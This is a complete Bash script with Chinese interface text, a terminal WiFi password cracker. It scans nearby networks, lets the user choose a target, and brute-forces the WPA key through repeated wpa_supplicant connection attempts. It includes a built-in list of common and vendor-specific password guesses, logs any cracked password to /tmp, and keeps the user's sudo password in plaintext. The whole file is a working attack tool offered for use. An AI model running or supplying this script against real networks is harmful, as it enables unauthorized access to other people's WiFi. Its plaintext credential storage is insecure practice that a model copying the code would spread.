#!/bin/bash
#=============================================================================
# WiFi 密码破解工具 — TUI 版
# 配置: ~/.config/wifi-cracker/config.json
#=============================================================================

set -uo pipefail
set +m

CONFIG_DIR="${XDG_CONFIG_HOME:-$HOME/.config}/wifi-cracker"
CONFIG_FILE="$CONFIG_DIR/config.json"
SUDO_PASS=""
INTERFACE=""
CTRL_DIR=$(mktemp -d)
WPA_CONF=$(mktemp)
ABORTED=0
TMP_WORDLIST=""

# ---- 首次运行引导 ----
FIRST_RUN_SETUP() {
    CLEAR
    HIDE_CURSOR

    echo -e "${BOLD}${CY}╔══════════════ 首次运行设置 ══════════════╗${R}"
    echo ""
    echo -e "  ${BOLD}欢迎使用 WiFi 密码破解工具${R}"
    echo ""
    echo -e "  本工具需要 ${YL}sudo${R} 权限来操作网卡和 wpa_supplicant。"
    echo -e "  密码仅存储在本地 ${GY}$CONFIG_FILE${R}，不会上传。"
    echo ""
    echo -e "  要跳过密码输入，直接留空即可"
    echo -e "  (之后每次 sudo 操作会弹出密码提示)。"
    echo ""
    echo -ne "  ${BOLD}sudo 密码 ${GY}[留空=手动输入]${R}: "

    SHOW_CURSOR
    local pwd
    read -rs pwd
    HIDE_CURSOR
    echo ""

    mkdir -p "$CONFIG_DIR"
    cat > "$CONFIG_FILE" << JSONEOF
{
    "sudo_password": "$pwd",
    "default_dict": "$HOME/wifi_dict.txt",
    "last_iface": ""
}
JSONEOF
    chmod 600 "$CONFIG_FILE"

    echo ""
    echo -e "  ${GN}设置已保存${R}"
    sleep 1

    SUDO_PASS="$pwd"
}

# ---- 加载配置 ----
LOAD_CONFIG() {
    if [ ! -f "$CONFIG_FILE" ]; then
        FIRST_RUN_SETUP
        return
    fi

    # 用 grep 简单解析 JSON（避免依赖 jq）
    local pwd
    pwd=$(grep -oP '"sudo_password"\s*:\s*"\K[^"]*' "$CONFIG_FILE" 2>/dev/null || true)
    SUDO_PASS="$pwd"
}

# ---- 终端 ----
HIDE_CURSOR() { tput civis 2>/dev/null; }
SHOW_CURSOR() { tput cnorm 2>/dev/null; }
CLEAR() { tput clear 2>/dev/null; }

# ---- 颜色 ----
R='\033[0m'
RD='\033[0;31m'
GN='\033[0;32m'
YL='\033[1;33m'
BL='\033[0;34m'
CY='\033[0;36m'
WH='\033[1;37m'
GY='\033[0;90m'
BOLD='\033[1m'

LOAD_CONFIG

# ---- sudo 包装函数 ----
if [ -n "$SUDO_PASS" ]; then
    SUDO() { sudo -S <<< "$SUDO_PASS" "$@"; }
else
    SUDO() { sudo "$@"; }
fi

# ---- 清理 ----
cleanup() {
    ABORTED=1
    SHOW_CURSOR
    SUDO pkill -9 -f "wpa_supplicant.*$INTERFACE" 2>/dev/null || true
    SUDO ip link set "$INTERFACE" down 2>/dev/null || true
    sleep 0.3
    SUDO ip link set "$INTERFACE" up 2>/dev/null || true
    sleep 0.3
    nmcli device set "$INTERFACE" managed yes 2>/dev/null || true
    sleep 1
    nmcli radio wifi on 2>/dev/null || true
    rm -f "$WPA_CONF" "$TMP_WORDLIST"
    rm -rf "$CTRL_DIR"
    echo -e "${R}已退出, 网络恢复中..."
    exit 0
}
trap cleanup INT TERM

# ---- 检测网卡 ----
INTERFACE=$(iw dev 2>/dev/null | awk '/Interface/{print $2}' | head -1)
[ -z "$INTERFACE" ] && INTERFACE=$(nmcli -t -f DEVICE,TYPE device status 2>/dev/null | grep ':wifi$' | cut -d: -f1 | head -1)
[ -z "$INTERFACE" ] && { echo "未找到 WiFi 网卡"; exit 1; }
ORIGINAL_CONN=$(nmcli -t -f NAME,DEVICE connection show --active 2>/dev/null | grep ":${INTERFACE}$" | cut -d: -f1 || true)

# ===================================================================
# 界面 1: 扫描选择 WiFi
# ===================================================================
SCAN_AND_SELECT() {
    CLEAR
    HIDE_CURSOR

    echo -e "${BOLD}${CY}正在扫描 WiFi...${R}"
    nmcli device wifi rescan 2>/dev/null || true
    sleep 3

    local tmp=$(mktemp)
    nmcli -t -f SSID,SIGNAL,SECURITY,CHAN device wifi list 2>/dev/null | \
        grep -v '^:$' | grep -v '^$' | sort -t: -k2 -rn | head -50 > "$tmp"

    WIFI_LIST=(); WIFI_SIGNAL=(); WIFI_SEC=(); WIFI_CHAN=()
    local count=0
    while IFS=: read -r ssid signal sec chan; do
        [ -z "$ssid" ] && continue
        WIFI_LIST+=("$ssid"); WIFI_SIGNAL+=("$signal")
        WIFI_SEC+=("${sec:-开放}"); WIFI_CHAN+=("${chan:-?}")
        ((count++))
    done < "$tmp"
    rm -f "$tmp"
    [ $count -eq 0 ] && { echo "未扫描到 WiFi"; exit 1; }

    local cursor=0 scroll=0
    local page=$(( $(tput lines 2>/dev/null || echo 24) - 10 ))
    [ $page -gt $count ] && page=$count; [ $page -lt 1 ] && page=1

    while true; do
        CLEAR
        echo -e "${BOLD}${CY}═══ 选择目标 WiFi ═══${R}"
        echo -e "网卡: ${GN}$INTERFACE${R}    当前连接: ${YL}${ORIGINAL_CONN:-无}${R}"
        echo -e "${GY}↑↓ 选择  Enter 确认  Q 退出${R}"
        echo ""

        for ((i=scroll; i<scroll+page && i<count; i++)); do
            local sig=${WIFI_SIGNAL[$i]}
            local bar="" bar_c="$RD"
            if [ "$sig" -ge 75 ]; then bar="●●●●"; bar_c="$GN"
            elif [ "$sig" -ge 50 ]; then bar="●●●○"; bar_c="$YL"
            elif [ "$sig" -ge 25 ]; then bar="●●○○"; bar_c="$YL"
            else bar="●○○○"; fi

            local lock="🔒"; [ "${WIFI_SEC[$i]}" = "开放" ] || [ "${WIFI_SEC[$i]}" = "" ] && lock="  "

            if [ $i -eq $cursor ]; then
                printf "  ${BOLD}${GN}▸ %-28s${R}  ${bar_c}%s${R} %s  %3s%%  CH%-3s %s\n" \
                    "${WIFI_LIST[$i]:0:28}" "$bar" "$lock" "$sig" "${WIFI_CHAN[$i]}" "${WIFI_SEC[$i]}"
            else
                printf "   %-28s  ${bar_c}%s${R} %s  %3s%%  CH%-3s %s\n" \
                    "${WIFI_LIST[$i]:0:28}" "$bar" "$lock" "$sig" "${WIFI_CHAN[$i]}" "${WIFI_SEC[$i]}"
            fi
        done

        echo -ne "\n${GY}共 $count 个网络${R}"

        read -rsn1 key
        case "$key" in
            $'\x1b')
                read -rsn2 -t 0.01 k2
                case "$k2" in
                    '[A') ((cursor--)); [ $cursor -lt 0 ] && cursor=$((count-1)) ;;
                    '[B') ((cursor++)); [ $cursor -ge $count ] && cursor=0 ;;
                esac ;;
            'q'|'Q') cleanup ;;
            '') break ;;
        esac
        [ $cursor -lt $scroll ] && scroll=$cursor
        [ $cursor -ge $((scroll+page)) ] && scroll=$((cursor-page+1))
    done

    SELECTED_SSID="${WIFI_LIST[$cursor]}"
    SELECTED_SIGNAL="${WIFI_SIGNAL[$cursor]}"
    SELECTED_SEC="${WIFI_SEC[$cursor]}"
}

# ===================================================================
# 界面 2: 选字典
# ===================================================================
CHOOSE_DICT() {
    local cursor=0
    local options=(
        "内置精选  (~100条, 1分钟, 先跑这个)"
        "完整字典  (~10K条, 1-2小时, 内置跑完再选)"
        "自定义字典 (输入文件路径)"
        "  ← 返回重新选 WiFi"
    )

    while true; do
        CLEAR
        echo -e "${BOLD}${CY}═══ 选择密码字典 ═══${R}"
        echo -e "目标: ${RD}$SELECTED_SSID${R}    信号: ${YL}$SELECTED_SIGNAL%%${R}    加密: $SELECTED_SEC"
        echo ""

        for i in "${!options[@]}"; do
            if [ $i -eq $cursor ]; then
                echo -e "  ${BOLD}${GN}▸ ${WH}${options[$i]}${R}"
            else
                echo -e "  ${GY}  ${options[$i]}${R}"
            fi
        done

        echo -ne "\n${GY}↑↓ 选择  Enter 确认  Esc 返回${R}"

        read -rsn1 key
        case "$key" in
            $'\x1b')
                read -rsn2 -t 0.01 k2
                case "$k2" in
                    '[A') ((cursor--)); [ $cursor -lt 0 ] && cursor=$((${#options[@]}-1)) ;;
                    '[B') ((cursor++)); [ $cursor -ge ${#options[@]} ] && cursor=0 ;;
                    *) return 1 ;;
                esac ;;
            '') break ;;
        esac
    done

    case $cursor in
        0)
            TMP_WORDLIST=$(mktemp)
            cat > "$TMP_WORDLIST" << 'DICTEOF'
88888888
00000000
12345678
66666666
22222222
33333333
44444444
55555555
77777777
99999999
01234567
87654321
12341234
88889999
66668888
88886666
23456789
admin123
admin888
admin666
admin999
admin1234
adminadmin
Admin123
1q2w3e4r
password
password123
qwerty123
qwer1234
1q2w3e4r5t
woaini1314
a12345678
abc12345
abcd1234
iloveyou
hello123
mima1234
woaini520
xiaomi123
huawei123
huawei888
tplink123
tenda1234
mercury12
FAST1234
tastek.cn
tastek123
tastek888
tastek666
tastek2024
tastek2025
tastek2026
tastek1234
tastek8888
Tastek123
tastekwifi
TAS-WiFi
taswifi123
taswifi888
20192019
20202020
20212021
20222022
20232023
20242024
20252025
20262026
11111111
22222222
33333333
44444444
55555555
66666666
77777777
88888888
99999999
88888888
00000000
taobao123
weixin123
weixin888
qq123456
qq888888
douyin888
wifi12345
wifi8888
zxcvbnm12
qwertyui
1qaz2wsx3
qazwsxedc
13800138000
13512345678
13612345678
13712345678
13812345678
13912345678
h3c123456
ruijie123
phicomm12
DICTEOF
            WORDLIST="$TMP_WORDLIST"
            ;;
        1)
            WORDLIST="${HOME}/wifi_dict.txt"
            [ ! -f "$WORDLIST" ] && { echo "字典不存在: $WORDLIST"; sleep 2; return 1; }
            ;;
        2)
            SHOW_CURSOR
            echo -ne "\n${YL}输入字典路径 (留空回车=返回): ${R}"
            read -r WORDLIST
            HIDE_CURSOR
            [ -z "$WORDLIST" ] && { return 1; }
            [ ! -f "$WORDLIST" ] && { echo "文件不存在: $WORDLIST"; sleep 1; return 1; }
            ;;
        *) return 1 ;;
    esac

    TOTAL=$(grep -cEv '^$|^#' "$WORDLIST" 2>/dev/null || echo 0)
    return 0
}

# ===================================================================
# 界面 3: 确认
# ===================================================================
CONFIRM() {
    CLEAR
    echo -e "${BOLD}${CY}═══ 攻击确认 ═══${R}"
    echo ""
    echo -e "  目标 WiFi:   ${RD}$SELECTED_SSID${R}"
    echo -e "  加密方式:    $SELECTED_SEC"
    echo -e "  信号强度:    ${GN}$SELECTED_SIGNAL%%${R}"
    echo -e "  密码字典:    ${CY}$TOTAL${R} 条"
    echo -e "  预计最长:    ~$(( TOTAL / 120 )) 分钟"
    echo ""
    echo -e "${BOLD}按 ${GN}Enter${R}${BOLD} 开始攻击  |  ${RD}Esc${R}${BOLD} 取消${R}"

    while true; do
        read -rsn1 key
        case "$key" in
            '') return 0 ;;
            $'\x1b') return 1 ;;
        esac
    done
}

# ===================================================================
# 界面 4: 攻击
# ===================================================================
RUN_ATTACK() {
    CLEAR
    HIDE_CURSOR

    # 预热 sudo 凭据缓存 (后续调用不再输密码)
    SUDO -v 2>/dev/null

    # 准备 wpa_supplicant
    nmcli device set "$INTERFACE" managed no 2>/dev/null || true
    sleep 1
    SUDO pkill -9 wpa_supplicant 2>/dev/null || true
    sleep 0.5

    cat > "$WPA_CONF" << WPAEOF
ctrl_interface=$CTRL_DIR
update_config=1
WPAEOF
    SUDO wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211 2>/dev/null
    sleep 1
    # 改 socket 权限让后续 wpa_cli 不用 sudo
    SUDO chown "$USER:$USER" "$CTRL_DIR/$INTERFACE" 2>/dev/null || true

    local attempt=0 start_time found=0 found_pwd=""
    start_time=$(date +%s)

    while IFS= read -r pwd; do
        [[ -z "$pwd" || "$pwd" == \#* ]] && continue
        [ ${#pwd} -lt 8 ] && continue
        [ "$ABORTED" -eq 1 ] && break

        ((attempt++))
        local now elapsed pct
        now=$(date +%s)
        elapsed=$((now-start_time))
        pct=$((attempt*100/TOTAL)); [ $pct -gt 100 ] && pct=100

        # ETA
        local eta_str="..."
        [ $attempt -gt 0 ] && [ $pct -gt 0 ] && {
            local eta=$((elapsed*(TOTAL-attempt)/attempt))
            eta_str="$(printf "%d分%02d秒" $((eta/60)) $((eta%60)))"
        }

        # 绘制
        CLEAR
        echo -e "${BOLD}${RD}═══ 正在破解 ═══${R}"
        echo ""
        echo -e "目标: ${RD}$SELECTED_SSID${R}    加密: $SELECTED_SEC    信号: ${GN}$SELECTED_SIGNAL%%${R}"
        echo ""

        # 进度条
        local bar_w=50
        local filled=$((pct*bar_w/100))
        echo -ne "  ["
        for ((j=0; j<filled; j++)); do echo -ne "${GN}█${R}"; done
        for ((j=filled; j<bar_w; j++)); do echo -ne "${GY}░${R}"; done
        echo -ne "] ${pct}%"
        echo ""

        echo -e "  ${WH}$attempt${R} / ${CY}$TOTAL${R}    已用: ${elapsed}秒    剩余: ${YL}$eta_str${R}"
        echo -e "  ${BOLD}当前: ${YL}${pwd:0:30}${R}"
        echo ""
        echo -e "  ${GY}按 S 停止 | Q 退出${R}"

        # 只换密码，不动 SSID (首次自动创建网络)
        if [ "$attempt" -eq 1 ]; then
            wpa_cli -p "$CTRL_DIR" add_network >/dev/null 2>&1
            wpa_cli -p "$CTRL_DIR" set_network 0 ssid "\"$SELECTED_SSID\"" >/dev/null 2>&1
        fi
        wpa_cli -p "$CTRL_DIR" disable_network 0 >/dev/null 2>&1 || true
        wpa_cli -p "$CTRL_DIR" set_network 0 psk "\"$pwd\"" >/dev/null 2>&1
        wpa_cli -p "$CTRL_DIR" enable_network 0 >/dev/null 2>&1

        # 轮询 — 0.1秒快速轮询，错误密码秒判
        # 正确: DISCONNECTED→SCANNING→ASSOCIATED→4WAY_HANDSHAKE→COMPLETED
        # 错误: 4WAY_HANDSHAKE→DISCONNECTED (握手失败，状态转换秒判)
        local last_state=""
        for ((i=0; i<40; i++)); do
            wpa_state=$(wpa_cli -p "$CTRL_DIR" status 2>/dev/null | grep "^wpa_state=" | cut -d= -f2)
            [ -z "$wpa_state" ] && wpa_state="$last_state"

            [ "$wpa_state" = "COMPLETED" ] && { found=1; found_pwd="$pwd"; break 2; }

            case "$wpa_state" in
                "4WAY_HANDSHAKE"|"GROUP_HANDSHAKE"|ASSOCIATED)
                    [ $i -gt 30 ] && break ;;  # 握手等3秒
                SCANNING)
                    [ $i -gt 8 ] && break ;;   # 扫0.8秒不到→没网络
                DISCONNECTED|INACTIVE)
                    # 握手后断开→密码错，秒判; 一直断开→1秒判死
                    [[ "$last_state" =~ HANDSHAKE|ASSOCIATED ]] && break
                    [ $i -gt 10 ] && break ;;
            esac
            last_state="$wpa_state"

            read -t 0.1 -n 1 key 2>/dev/null < /dev/tty || true
            [ -n "$key" ] && {
                case "$key" in
                    's'|'S') ABORTED=1; break 2 ;;
                    'q'|'Q') cleanup ;;
                esac
            }
        done
    done < "$WORDLIST"

    # 结果
    CLEAR
    if [ "$found" -eq 1 ]; then
        echo -e "${BOLD}${GN}═══ 密码已找到! ═══${R}"
        echo ""
        echo -e "  WiFi:     ${RD}$SELECTED_SSID${R}"
        echo -e "  密码:     ${GN}${BOLD}$found_pwd${R}"
        echo -e "  尝试:     $attempt / $TOTAL"
        echo -e "  用时:     $(($(date +%s)-start_time))秒"
        echo ""
        echo -e "${GY}已保存到 /tmp/wifi_brute_found.log${R}"
        echo "$(date): SSID='$SELECTED_SSID' PASSWORD='$found_pwd'" >> /tmp/wifi_brute_found.log
    else
        echo -e "${BOLD}${YL}═══ 未找到密码 ═══${R}"
        echo ""
        echo -e "  已尝试 $attempt 个密码, 字典已穷尽"
        echo -e "  建议换完整字典或更大的外部字典"
    fi
    echo ""
    echo -ne "${GY}按任意键继续...${R}"
    read -rsn1 _
}

# ===================================================================
# 主流程
# ===================================================================
main() {
    SCAN_AND_SELECT
    while true; do
        if CHOOSE_DICT; then
            if CONFIRM; then
                RUN_ATTACK
                break
            fi
        else
            SCAN_AND_SELECT
        fi
    done
}

main
cleanup
